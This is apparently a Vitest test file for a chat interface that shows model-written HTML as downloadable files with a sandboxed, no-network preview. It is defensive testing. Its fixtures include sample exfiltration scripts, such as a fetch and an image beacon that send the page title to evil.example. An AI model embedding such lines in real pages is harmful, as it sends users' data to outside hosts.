import { act, fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { PREVIEW_POLICY, blockedHost, fileName, formatSize, mimeFor, previewDocument, wholeDocument } from './chat-files';
import { ChatMarkdown } from './Markdown';

const GAME = `<!DOCTYPE html>
<html lang="en">
<head><title>TETRIS — Neon</title></head>
<body><canvas id="c"></canvas><script>document.title = 'x';</script></body>
</html>
`;

describe('wholeDocument', () => {
  it('recognizes complete HTML and SVG documents, not snippets', () => {
    expect(wholeDocument(GAME, 'html')).toBe('html');
    expect(wholeDocument(GAME, '')).toBe('html');
    expect(wholeDocument('<div class="a">hi</div>', 'html')).toBeNull();
    expect(wholeDocument('<svg viewBox="0 0 10 10"><circle r="4"/></svg>', 'svg')).toBe('svg');
    expect(wholeDocument('<?xml version="1.0"?>\n<svg xmlns="x"></svg>\n', 'xml')).toBe('svg');
    expect(wholeDocument('<svg><g>', 'svg')).toBeNull();
    expect(wholeDocument(GAME, 'python')).toBeNull();
  });
});

describe('fileName', () => {
  it('names a document after its title and code after its language', () => {
    expect(fileName(GAME, 'html')).toBe('tetris-neon.html');
    expect(fileName('<!doctype html><html></html>', 'html')).toBe('html.html');
    expect(fileName('print(1)', 'python')).toBe('code.py');
    expect(fileName('FROM alpine', 'dockerfile')).toBe('Dockerfile');
    expect(fileName('x', '')).toBe('code.txt');
    expect(fileName('x', 'some lang!')).toBe('code.txt');
  });
  it('gives types and sizes people read', () => {
    expect(mimeFor('a.html')).toBe('text/html;charset=utf-8');
    expect(mimeFor('a.py')).toBe('text/plain;charset=utf-8');
    expect(formatSize(512)).toBe('512 B');
    expect(formatSize(45_561)).toBe('44 KB');
  });
});

describe('previewDocument', () => {
  it("puts the storage stand-in before any of the page's scripts", () => {
    const out = previewDocument(GAME, 'html');
    expect(out.indexOf('localStorage')).toBeLessThan(out.indexOf('<canvas'));
    expect(out.startsWith('<!DOCTYPE html>')).toBe(true); // stays in standards mode
  });

  // 2026-11 security review, WEB-03: a previewed page could call any host.
  it('puts a no-network policy before everything the model wrote, html and svg', () => {
    const hostile =
      '<script>fetch("https://evil.example/c?d="+document.title)</script><html><head><title>x</title></head></html>';
    for (const [text, kind] of [
      [GAME, 'html'],
      [hostile, 'html'],
      ['<!-- <head> --><script>new Image().src="https://evil.example"</script>', 'html'],
      ['<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example")</script></svg>', 'svg'],
    ] as const) {
      const out = previewDocument(text, kind);
      const policy = out.indexOf('http-equiv="Content-Security-Policy"');
      expect(policy).toBeGreaterThan(-1);
      // Nothing of the page's comes before the policy.
      expect(out.indexOf(text)).toBeGreaterThan(policy);
      expect(out.slice(0, policy)).toBe('<!DOCTYPE html><meta ');
      expect(out.endsWith(text)).toBe(true);
    }
  });

  it('allows what is written into the page and no host at all', () => {
    expect(PREVIEW_POLICY).toContain("default-src 'none'");
    expect(PREVIEW_POLICY).toContain("form-action 'none'");
    expect(PREVIEW_POLICY).toContain("base-uri 'none'");
    expect(PREVIEW_POLICY).toContain("script-src 'unsafe-inline'");
    // No scheme or host source that reaches the network, and no wildcard.
    expect(PREVIEW_POLICY).not.toMatch(/https?:|wss?:|\*|'self'/);
  });

  it('names the host of a blocked request, and ignores what was not a request', () => {
    expect(blockedHost('https://cdn.example.com/lib.js?x=1')).toBe('cdn.example.com');
    expect(blockedHost('wss://evil.example:8443/s')).toBe('evil.example:8443');
    expect(blockedHost('http://203.0.113.9')).toBe('203.0.113.9');
    for (const not of ['inline', 'eval', 'data', '', 'javascript:alert(1)', undefined, 42, { a: 1 }])
      expect(blockedHost(not)).toBe('');
  });
});

describe('file card', () => {
  it('shows a whole HTML document as a file, with a sandboxed preview', () => {
    const { container } = render(<ChatMarkdown text={'Here it is:\n\n```html\n' + GAME + '```\n\nEnjoy.'} />);
    expect(screen.getByText('tetris-neon.html')).toBeTruthy();
    expect(container.querySelector('.chat-code')).toBeNull(); // no wall of code
    fireEvent.click(screen.getByRole('button', { name: 'Preview' }));
    const frame = container.querySelector('iframe');
    expect(frame?.getAttribute('sandbox')).toBe('allow-scripts allow-pointer-lock allow-modals');
    expect(frame?.getAttribute('sandbox')).not.toContain('allow-same-origin');
    // The preview is a page of its own (see PREVIEW_FRAME); it asks for the
    // document, and gets the page with the no-network policy first.
    expect(frame?.getAttribute('src')).toBe('/chat/preview-frame');
    expect(frame?.hasAttribute('srcdoc')).toBe(false);
    const sent = vi.spyOn(frame!.contentWindow!, 'postMessage').mockImplementation(() => undefined);
    act(() => {
      window.dispatchEvent(new MessageEvent('message', { data: { janusPreviewReady: true }, source: window }));
    });
    expect(sent).not.toHaveBeenCalled(); // only the preview itself is answered
    act(() => {
      window.dispatchEvent(new MessageEvent('message', { data: { janusPreviewReady: true }, source: frame!.contentWindow }));
    });
    const doc = (sent.mock.calls[0]?.[0] as { janusPreviewDocument: string }).janusPreviewDocument;
    expect(doc).toContain('<canvas id="c">');
    expect(doc.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"')).toBe(true);
    fireEvent.click(screen.getByRole('button', { name: 'Code' }));
    expect(container.querySelector('.chat-file .chat-code')).not.toBeNull();
  });

  it('downloads the file under its name', () => {
    const create = vi.fn(() => 'blob:x');
    const revoke = vi.fn();
    Object.assign(URL, { createObjectURL: create, revokeObjectURL: revoke });
    const clicked: string[] = [];
    const orig = HTMLAnchorElement.prototype.click;
    HTMLAnchorElement.prototype.click = function (this: HTMLAnchorElement) {
      clicked.push(this.download);
    };
    try {
      render(<ChatMarkdown text={'```html\n' + GAME + '```'} />);
      fireEvent.click(screen.getByRole('button', { name: 'Download' }));
      expect(clicked).toEqual(['tetris-neon.html']);
      expect(create).toHaveBeenCalledOnce();
    } finally {
      HTMLAnchorElement.prototype.click = orig;
    }
  });

  it('shows progress while the file is still arriving', () => {
    render(<ChatMarkdown text={'```html\n<!DOCTYPE html>\n<html>\n<head>'} streaming />);
    expect(screen.getByText(/Writing… 3 lines/)).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Preview' }) as HTMLButtonElement).disabled).toBe(true);
  });

  it('leaves ordinary code as code, with a Download button', () => {
    const { container } = render(<ChatMarkdown text={'```python\nprint(1)\n```'} />);
    expect(container.querySelector('.chat-file')).toBeNull();
    expect(screen.getByRole('button', { name: 'Download code.py' })).toBeTruthy();
  });
});

describe('preview network access', () => {
  it('tells the person when the preview tried to reach a host', () => {
    const { container } = render(<ChatMarkdown text={'```html\n' + GAME + '```'} />);
    fireEvent.click(screen.getByRole('button', { name: 'Preview' }));
    const frame = container.querySelector('iframe') as HTMLIFrameElement;
    expect(container.querySelector('.chat-file-blocked')).toBeNull();
    const post = (data: unknown, source: unknown) =>
      act(() => {
        window.dispatchEvent(new MessageEvent('message', { data, source: source as MessageEventSource }));
      });
    // Not from the preview: ignored.
    post({ janusPreviewBlocked: 'https://spoof.example/x' }, window);
    expect(container.querySelector('.chat-file-blocked')).toBeNull();
    post({ janusPreviewBlocked: 'https://cdn.example.com/lib.js' }, frame.contentWindow);
    post({ janusPreviewBlocked: 'https://cdn.example.com/other.js' }, frame.contentWindow);
    post({ janusPreviewBlocked: 'inline' }, frame.contentWindow);
    // A navigation is stopped by the console's own policy and reported here.
    act(() => {
      document.dispatchEvent(
        Object.assign(new Event('securitypolicyviolation'), {
          effectiveDirective: 'frame-src',
          blockedURI: 'https://evil.example',
        }),
      );
    });
    const note = container.querySelector('.chat-file-blocked');
    expect(note?.textContent).toContain('this preview tried to reach cdn.example.com, evil.example.');
    expect(note?.textContent).toContain('nothing was sent');
    // Closing and reopening starts clean.
    fireEvent.click(screen.getByRole('button', { name: 'Close preview' }));
    fireEvent.click(screen.getByRole('button', { name: 'Preview' }));
    expect(container.querySelector('.chat-file-blocked')).toBeNull();
  });
});
